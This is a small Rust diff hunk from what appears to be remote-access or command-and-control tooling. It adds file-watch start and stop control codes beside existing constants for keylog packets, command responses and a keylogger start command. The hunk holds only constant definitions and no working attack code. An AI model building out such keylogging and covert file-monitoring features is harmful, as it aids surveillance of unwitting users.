@@ -12,6 +12,8 @@ pub const PACKET_TYPE_CMD_RESP: u8 = 5;
 pub const PACKET_TYPE_FILE: u8 = 6;
 pub const PACKET_TYPE_KEYLOG: u8 = 7;
 pub const PACKET_TYPE_CTRL: u8 = 8;
+pub const CTRL_START_FILE_WATCH: u8 = 5;
+pub const CTRL_STOP_FILE_WATCH: u8 = 6;
 
 // Control subtypes for PACKET_TYPE_CTRL
 pub const CTRL_START_KEYLOGGER: u8 = 1;
